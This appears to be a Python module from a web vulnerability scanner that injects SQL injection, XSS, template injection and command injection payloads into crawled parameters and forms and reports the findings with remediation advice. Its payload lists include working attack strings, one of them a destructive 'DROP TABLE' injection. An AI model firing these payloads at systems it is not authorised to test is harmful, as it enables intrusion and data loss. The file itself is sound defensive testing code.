"""
Active Payload Fuzzer.

Takes the attack surface (urls, forms, parameters) mapped by the crawler
and injects active payloads (SQLi, XSS, etc.) to detect vulnerabilities.
"""

from __future__ import annotations

import asyncio
from typing import Any, Dict, List
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

import aiohttp

from engine.models.finding import Finding, Severity
from engine.scanners.base import BaseScanner
from engine.scanners.registry import ScannerRegistry
from engine.utils.network import normalize_target

# ── Expanded Payload Library ─────────────────────────────────

# Error-Based SQLi
SQLI_PAYLOADS = [
    "'",
    "\"",
    "1' OR '1'='1",
    "1 OR 1=1",
    "admin' --",
    "' UNION SELECT NULL--",
    "1' ORDER BY 100--",
    "1'; DROP TABLE test--",
]

# Blind / Time-Based SQLi
SQLI_BLIND_PAYLOADS = [
    "1' AND SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1' AND pg_sleep(3)--",
]

# Reflected XSS
XSS_PAYLOADS = [
    "vltro<script>alert(1)</script>pwn",
    "\"><svg/onload=alert(1)>",
    "javascript:alert(1)//",
    "'><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

# Polyglot XSS (works in multiple contexts)
XSS_POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    "'\"-->]]>*/</script><svg onload=alert(1)>",
]

# Server-Side Template Injection (using specific high-entropy math)
SSTI_PAYLOADS = [
    "{{1337*7331}}",
    "${1337*7331}",
    "<%= 1337*7331 %>",
    "#{1337*7331}",
    "{1337*7331}",
]

# OS Command Injection (using high-entropy string echo)
CMDI_PAYLOADS = [
    "; echo VLTR0_CMD_EXEC_9981",
    "| echo VLTR0_CMD_EXEC_9981",
    "$(echo VLTR0_CMD_EXEC_9981)",
    "`echo VLTR0_CMD_EXEC_9981`",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query(): query failed",
    "sqlite3::query",
    "microsoft ole db provider",
    "ora-01756",
    "syntax error at or near",
]

SSTI_INDICATORS = ["9801547"]  # 1337 * 7331 = 9801547

CMDI_INDICATORS = [
    "VLTR0_CMD_EXEC_9981",
]

@ScannerRegistry.register
class FuzzerScanner(BaseScanner):
    
    @property
    def name(self) -> str:
        return "fuzzer"

    @property
    def display_name(self) -> str:
        return "Active Payload Fuzzer"

    @property
    def description(self) -> str:
        return "Injects SQLi, XSS, SSTI, and command injection payloads into mapped inputs and forms"

    async def _test_sqli(self, session: aiohttp.ClientSession, url: str, method: str = "GET", data: dict | None = None) -> Finding | None:
        """Test for basic Error-Based SQLi."""
        try:
            if method == "GET":
                async with session.get(url, allow_redirects=True) as resp:
                    if resp.status in (403, 406): return None # Ignore WAF blocks
                    text = await resp.text()
            else:
                async with session.post(url, data=data, allow_redirects=True) as resp:
                    if resp.status in (403, 406): return None # Ignore WAF blocks
                    text = await resp.text()
            
            text_lower = text.lower()
            for err in SQLI_ERRORS:
                if err in text_lower:
                    return Finding(
                        scanner=self.name,
                        type="SQL Injection (Error-Based)",
                        severity=Severity.CRITICAL,
                        title=f"SQLi found via payload on {method} parameter",
                        description="The application returned a database error indicating that user input is not properly sanitized before being used in a SQL query. This could allow attackers to read, modify, or delete database contents.",
                        remediation="Use prepared statements (parameterized queries) for all database operations. Implement strict input validation.",
                        evidence=f"Database error trigger: '{err}'",
                        location=url,
                        cwe_id="CWE-89"
                    )
        except Exception:
            pass
        return None

    async def _test_xss(self, session: aiohttp.ClientSession, url: str, payload: str, method: str = "GET", data: dict | None = None) -> Finding | None:
        """Test for basic Reflected XSS."""
        try:
            if method == "GET":
                async with session.get(url, allow_redirects=True) as resp:
                    if resp.status in (403, 406): return None # Ignore WAF blocks
                    text = await resp.text()
            else:
                async with session.post(url, data=data, allow_redirects=True) as resp:
                    if resp.status in (403, 406): return None # Ignore WAF blocks
                    text = await resp.text()
            
            # If the payload is reflected exactly without encoding
            if payload in text:
                # To prevent false positives where safe payloads (e.g. javascript:alert) are reflected 
                # inside HTML-encoded contexts, we inject a unique probe tag to confirm execution context.
                probe = "<vltro_xss_probe>"
                probe_text = ""
                
                try:
                    if method == "GET":
                        parsed = urlparse(url)
                        params = parse_qsl(parsed.query)
                        # Replace the payload string with our probe tag in the parameters
                        new_params = [(k, v.replace(payload, probe)) for k, v in params]
                        fuzzed_query = urlencode(new_params)
                        probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, fuzzed_query, parsed.fragment))
                        
                        async with session.get(probe_url, allow_redirects=True) as p_resp:
                            probe_text = await p_resp.text()
                    else:
                        if data:
                            probe_data = {k: v.replace(payload, probe) if isinstance(v, str) else v for k, v in data.items()}
                            async with session.post(url, data=probe_data, allow_redirects=True) as p_resp:
                                probe_text = await p_resp.text()
                except Exception:
                    pass

                # If the probe tag is nowhere in the response text, it means it was stripped, 
                # URL-encoded (in an attribute), or HTML-encoded properly. 
                # This ensures we don't flag non-HTML contexts like URL attributes as false positives.
                if probe not in probe_text:
                    return None
                    
                return Finding(
                    scanner=self.name,
                    type="Cross-Site Scripting (Reflected)",
                    severity=Severity.HIGH,
                    title=f"Reflected XSS found via payload on {method} parameter",
                    description="The application reflects user input into the HTML response without proper sanitization or output encoding. This allows execution of arbitrary JavaScript in the victim's browser.",
                    remediation="Contextually encode all user-supplied data before rendering it in the HTML response. Implement a strict Content Security Policy (CSP).",
                    evidence=f"Payload reflected unmodified: {payload}",
                    location=url,
                    cwe_id="CWE-79"
                )
        except Exception:
            pass
        return None

    async def _test_ssti(self, session: aiohttp.ClientSession, url: str, payload: str, method: str = "GET", data: dict | None = None) -> Finding | None:
        """Test for Server-Side Template Injection."""
        try:
            if method == "GET":
                async with session.get(url, allow_redirects=True) as resp:
                    if resp.status >= 400: return None # Ignore WAF blocks
                    text = await resp.text()
            else:
                async with session.post(url, data=data, allow_redirects=True) as resp:
                    if resp.status >= 400: return None # Ignore WAF blocks
                    text = await resp.text()

            for indicator in SSTI_INDICATORS:
                if indicator in text and payload not in text:
                    # The math was evaluated but the raw payload wasn't reflected
                    return Finding(
                        scanner=self.name,
                        type="Server-Side Template Injection",
                        severity=Severity.CRITICAL,
                        title=f"SSTI found via payload on {method} parameter",
                        description="The server evaluated a template expression (e.g., {{1337*7331}} → 9801547), confirming code execution in the template engine. This can lead to Remote Code Execution.",
                        remediation="Never pass user input directly into template engines. Use strict sandboxing or avoid server-side template rendering with user data.",
                        evidence=f"Payload: {payload}, Response contained: {indicator}",
                        location=url,
                        cwe_id="CWE-1336",
                    )
        except Exception:
            pass
        return None

    async def _test_cmdi(self, session: aiohttp.ClientSession, url: str, method: str = "GET", data: dict | None = None) -> Finding | None:
        """Test for OS Command Injection."""
        try:
            if method == "GET":
                async with session.get(url, allow_redirects=True) as resp:
                    if resp.status in (403, 406): return None # Ignore WAF blocks
                    text = await resp.text()
            else:
                async with session.post(url, data=data, allow_redirects=True) as resp:
                    if resp.status in (403, 406): return None # Ignore WAF blocks
                    text = await resp.text()

            text_lower = text.lower()
            for indicator in CMDI_INDICATORS:
                if indicator in text_lower:
                    return Finding(
                        scanner=self.name,
                        type="OS Command Injection",
                        severity=Severity.CRITICAL,
                        title=f"Command injection found via {method} parameter",
                        description="The application executed an OS command from user-supplied input. This allows full system compromise.",
                        remediation="Never pass user input to OS command functions. Use language-native APIs instead of shell execution.",
                        evidence=f"Command output indicator: '{indicator}'",
                        location=url,
                        cwe_id="CWE-78",
                    )
        except Exception:
            pass
        return None

    async def scan(self, target: str, **kwargs: Any) -> tuple[list[Finding], Any] | list[Finding]:
        attack_surface = kwargs.get("attack_surface", {})
        findings: list[Finding] = []
        seen: set[str] = set()

        if not attack_surface:
            self.report_progress(100.0, "No attack surface data provided. Run crawler first.")
            return findings

        timeout_val = aiohttp.ClientTimeout(total=self.timeout)
        urls_to_test = attack_surface.get("internal_urls", [])
        forms_to_test = attack_surface.get("forms", [])

        # Filter URLs to only those with query parameters
        param_urls = [u for u in urls_to_test if "?" in u]

        # Cap to prevent excessive fuzzing
        param_urls = param_urls[:30]
        forms_to_test = forms_to_test[:15]

        total_tests = len(param_urls) + len(forms_to_test)
        if total_tests == 0:
            self.report_progress(100.0, "No inputs or parameters found to fuzz.")
            return findings

        self.report_progress(5.0, f"Fuzzing {len(param_urls)} parameterized URLs and {len(forms_to_test)} forms")

        tested_count = 0
        semaphore = asyncio.Semaphore(20)

        def _dedup_add(finding: Finding | None) -> bool:
            """Add finding if unique. Returns True if added."""
            if finding is None:
                return False
            key = f"{finding.title}-{finding.location}"
            if key in seen:
                return False
            seen.add(key)
            findings.append(finding)
            return True

        async def _limited(coro):
            """Run a coroutine under the semaphore."""
            async with semaphore:
                return await coro

        async with aiohttp.ClientSession(timeout=timeout_val, headers={"User-Agent": "Veltro-Fuzzer/1.0"}) as session:

            # ── 1. Fuzz URLs with query parameters (concurrent per vuln type) ──
            for url in param_urls:
                parsed = urlparse(url)
                params = parse_qsl(parsed.query)

                for i, (key, _value) in enumerate(params):

                    # SQLi — run all payloads concurrently, short-circuit on first hit
                    sqli_tasks = []
                    for sqli in SQLI_PAYLOADS:
                        fp = params.copy()
                        fp[i] = (key, sqli)
                        fq = urlencode(fp)
                        fu = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, fq, parsed.fragment))
                        sqli_tasks.append(_limited(self._test_sqli(session, fu, "GET")))

                    for result in await asyncio.gather(*sqli_tasks, return_exceptions=True):
                        if not isinstance(result, Exception):
                            _dedup_add(result)

                    # Blind SQLi — concurrent
                    blind_tasks = []
                    for bsql in SQLI_BLIND_PAYLOADS:
                        fp = params.copy()
                        fp[i] = (key, bsql)
                        fq = urlencode(fp)
                        fu = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, fq, parsed.fragment))
                        blind_tasks.append(_limited(self._test_sqli(session, fu, "GET")))

                    for result in await asyncio.gather(*blind_tasks, return_exceptions=True):
                        if not isinstance(result, Exception):
                            _dedup_add(result)

                    # XSS — concurrent
                    xss_tasks = []
                    for xss in XSS_PAYLOADS + XSS_POLYGLOT_PAYLOADS:
                        fp = params.copy()
                        fp[i] = (key, xss)
                        fq = urlencode(fp)
                        fu = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, fq, parsed.fragment))
                        xss_tasks.append(_limited(self._test_xss(session, fu, xss, "GET")))

                    for result in await asyncio.gather(*xss_tasks, return_exceptions=True):
                        if not isinstance(result, Exception):
                            _dedup_add(result)

                    # SSTI — concurrent
                    ssti_tasks = []
                    for ssti in SSTI_PAYLOADS:
                        fp = params.copy()
                        fp[i] = (key, ssti)
                        fq = urlencode(fp)
                        fu = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, fq, parsed.fragment))
                        ssti_tasks.append(_limited(self._test_ssti(session, fu, ssti, "GET")))

                    for result in await asyncio.gather(*ssti_tasks, return_exceptions=True):
                        if not isinstance(result, Exception):
                            _dedup_add(result)

                    # Command Injection — concurrent
                    cmdi_tasks = []
                    for cmdi in CMDI_PAYLOADS:
                        fp = params.copy()
                        fp[i] = (key, cmdi)
                        fq = urlencode(fp)
                        fu = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, fq, parsed.fragment))
                        cmdi_tasks.append(_limited(self._test_cmdi(session, fu, "GET")))

                    for result in await asyncio.gather(*cmdi_tasks, return_exceptions=True):
                        if not isinstance(result, Exception):
                            _dedup_add(result)

                tested_count += 1
                if total_tests > 0:
                    self.report_progress(5.0 + (tested_count / total_tests * 90.0), f"Fuzzing URLs ({len(findings)} findings)")

            # ── 2. Fuzz Forms (concurrent per vuln type) ──
            for form in forms_to_test:
                action = form.get("action")
                method = form.get("method", "GET").upper()
                inputs = form.get("inputs", [])

                if not action or not inputs:
                    tested_count += 1
                    continue

                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue

                    base_data = {it.get("name"): "test" for it in inputs if it.get("name")}

                    # SQLi forms — concurrent
                    sqli_form_tasks = []
                    for sqli in SQLI_PAYLOADS:
                        td = base_data.copy()
                        td[name] = sqli
                        if method == "GET":
                            p = urlparse(action)
                            fq = urlencode(td)
                            fu = urlunparse((p.scheme, p.netloc, p.path, p.params, fq, p.fragment))
                            sqli_form_tasks.append(_limited(self._test_sqli(session, fu, "GET")))
                        else:
                            sqli_form_tasks.append(_limited(self._test_sqli(session, action, "POST", data=td)))

                    for result in await asyncio.gather(*sqli_form_tasks, return_exceptions=True):
                        if not isinstance(result, Exception):
                            _dedup_add(result)

                    # XSS forms — concurrent
                    xss_form_tasks = []
                    for xss in XSS_PAYLOADS:
                        td = base_data.copy()
                        td[name] = xss
                        if method == "GET":
                            p = urlparse(action)
                            fq = urlencode(td)
                            fu = urlunparse((p.scheme, p.netloc, p.path, p.params, fq, p.fragment))
                            xss_form_tasks.append(_limited(self._test_xss(session, fu, xss, "GET")))
                        else:
                            xss_form_tasks.append(_limited(self._test_xss(session, action, xss, "POST", data=td)))

                    for result in await asyncio.gather(*xss_form_tasks, return_exceptions=True):
                        if not isinstance(result, Exception):
                            _dedup_add(result)

                tested_count += 1
                if total_tests > 0:
                    self.report_progress(5.0 + (tested_count / total_tests * 90.0), f"Fuzzing forms ({len(findings)} findings)")

        self.report_progress(100.0, f"Fuzzing complete: {len(findings)} findings")
        return findings

